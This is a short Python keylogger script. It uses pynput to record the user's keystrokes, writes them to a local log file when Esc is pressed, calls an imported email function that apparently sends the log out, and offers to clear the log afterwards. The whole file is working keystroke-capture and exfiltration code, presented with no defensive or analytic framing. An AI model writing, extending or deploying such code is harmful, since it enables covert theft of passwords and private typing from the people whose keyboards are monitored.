
from pynput.keyboard import Key, Listener  #Handling Keyboard listeners.
from sendemail import sendemail #Imported email module
from logfilecleaner import clean 
import sys
keys = []



def on_press(key):
    
    if key== Key.space:
        pass
    elif key == Key.shift:
        pass
    elif key == Key.ctrl:
        pass
    
    else:
        keys.append(key)
    
def on_release(key):
    if key == Key.esc:
        # Message=""
        # for  char in keys:
        #         Message+=char
         
        with open('logfile.txt','w') as file:  
        #         file.writelines(Message)
         #   Logging keys pressed and writting in a file.
              file.writelines(str(keys))  #Converting keys to string.
        sendemail()
        return False  
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join() 

inp=int(input('Press 0 to clean Log 1 to keep Previous log'))
if inp==0:
    clean()

